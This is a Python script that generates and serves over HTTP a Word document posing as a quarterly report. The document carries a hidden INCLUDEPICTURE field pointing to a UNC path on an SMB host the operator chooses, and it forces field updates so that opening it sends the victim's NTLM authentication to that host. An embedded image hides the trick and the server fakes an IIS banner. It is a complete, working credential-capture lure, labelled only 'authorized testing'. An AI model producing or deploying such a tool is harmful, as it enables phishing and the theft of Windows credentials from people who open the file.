#!/usr/bin/env python3
"""Serve a Word .docx that looks fine + pulls an image over SMB (UNC).

- Embedded PNG so the doc is not a broken X placeholder
- INCLUDEPICTURE field to \\\\host\\share\\img (triggers NTLM on open/update)

  python3 serve_word_smb.py --smb-host listener.example --port 18081

Authorized testing only.
"""
from __future__ import annotations

import argparse
import io
import os
import struct
import sys
import zlib
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote, urlparse
from xml.sax.saxutils import escape


DOC_NAME = "report.docx"
IMG_NAME = "logo.png"


def make_png(w=128, h=128) -> bytes:
    """Simple solid PNG (no deps) so Word shows a real picture."""
    def chunk(tag: bytes, data: bytes) -> bytes:
        return (struct.pack(">I", len(data)) + tag + data +
                struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF))

    # light blue-gray fill
    row = b"\x00" + bytes([180, 198, 220]) * w
    raw = row * h
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    return (b"\x89PNG\r\n\x1a\n" +
            chunk(b"IHDR", ihdr) +
            chunk(b"IDAT", zlib.compress(raw, 9)) +
            chunk(b"IEND", b""))


def build_docx(smb_host: str, share: str, image: str,
               embed_png: bytes) -> bytes:
    unc = f"\\\\{smb_host}\\{share}\\{image}"
    # Word also accepts file:// for some builds; INCLUDEPICTURE uses UNC.
    instr = f' INCLUDEPICTURE "{unc}" \\d \\* MERGEFORMAT '

    content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="png" ContentType="image/png"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/settings.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
</Types>
"""

    rels_root = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
</Relationships>
"""

    rels_doc = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rIdEmbed"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="media/image1.png"/>
  <Relationship Id="rIdSettings"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"
    Target="settings.xml"/>
</Relationships>
"""

    # Force field update when Word opens the doc → INCLUDEPICTURE hits SMB.
    settings = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:updateFields w:val="true"/>
</w:settings>
"""

    # Visible embedded image (no broken-X) + INCLUDEPICTURE to UNC (auth).
    document = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
            xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
            xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
  <w:body>
    <w:p>
      <w:r><w:t>Quarterly report — figure below.</w:t></w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="1524000" cy="1524000"/>
            <wp:docPr id="1" name="Picture 1"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image1.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rIdEmbed"/>
                    <a:stretch><a:fillRect/></a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1524000" cy="1524000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect"><a:avLst/></a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
      <w:r><w:instrText xml:space="preserve">{escape(instr)}</w:instrText></w:r>
      <w:r><w:fldChar w:fldCharType="separate"/></w:r>
      <w:r><w:t>[chart]</w:t></w:r>
      <w:r><w:fldChar w:fldCharType="end"/></w:r>
    </w:p>
    <w:sectPr>
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/>
    </w:sectPr>
  </w:body>
</w:document>
"""

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", rels_root)
        zf.writestr("word/document.xml", document)
        zf.writestr("word/_rels/document.xml.rels", rels_doc)
        zf.writestr("word/settings.xml", settings)
        zf.writestr("word/media/image1.png", embed_png)
    return buf.getvalue()


def make_handler(docx_bytes: bytes, filename: str):
    class Handler(BaseHTTPRequestHandler):
        server_version = "Microsoft-IIS/10.0"
        sys_version = ""
        protocol_version = "HTTP/1.1"

        def log_message(self, fmt, *args):
            sys.stderr.write("[%s] %s - %s\n"
                             % (self.log_date_time_string(),
                                self.address_string(), fmt % args))

        def _send(self, code, body, ctype, disposition=None):
            self.send_response(code)
            self.send_header("Server", "Microsoft-IIS/10.0")
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            if disposition:
                self.send_header("Content-Disposition", disposition)
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)

        def do_HEAD(self):
            self.do_GET(head=True)

        def do_GET(self, head=False):
            path = unquote(urlparse(self.path).path).rstrip("/") or "/"
            if path in ("/", f"/{filename}", f"/files/{filename}",
                        "/download", "/report.docx"):
                ctype = ("application/vnd.openxmlformats-officedocument."
                         "wordprocessingml.document")
                print(f"[+] GET {path} -> {filename} "
                      f"({len(docx_bytes)} bytes) from {self.client_address[0]}")
                if head:
                    self.send_response(200)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Content-Length", str(len(docx_bytes)))
                    self.end_headers()
                    return
                self._send(200, docx_bytes, ctype,
                           f'attachment; filename="{filename}"')
                return
            self._send(404, b"not found\n", "text/plain; charset=utf-8")

    return Handler


def main():
    p = argparse.ArgumentParser(
        description="HTTP-serve Word doc with embedded pic + SMB INCLUDEPICTURE")
    p.add_argument("-i", "--bind", default="127.0.0.1")
    p.add_argument("-p", "--port", type=int, default=18081)
    p.add_argument("--smb-host", required=True,
                   help="authorized SMB listener hostname or address")
    p.add_argument("--share", default="PUBLIC")
    p.add_argument("--image", default=IMG_NAME)
    p.add_argument("--filename", default=DOC_NAME)
    p.add_argument("--write", default=None)
    args = p.parse_args()

    png = make_png()
    data = build_docx(args.smb_host, args.share, args.image, png)
    if args.write:
        os.makedirs(os.path.dirname(args.write) or ".", exist_ok=True)
        with open(args.write, "wb") as f:
            f.write(data)
        print(f"[+] wrote {args.write} ({len(data)} bytes)")

    unc = f"\\\\{args.smb_host}\\{args.share}\\{args.image}"
    print(f"[+] visible   : embedded PNG (no broken-X)")
    print(f"[+] SMB field : INCLUDEPICTURE {unc}")

    httpd = ThreadingHTTPServer((args.bind, args.port),
                                make_handler(data, args.filename))
    print(f"[+] http://{args.bind}:{args.port}/{args.filename}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nbye")


if __name__ == "__main__":
    main()
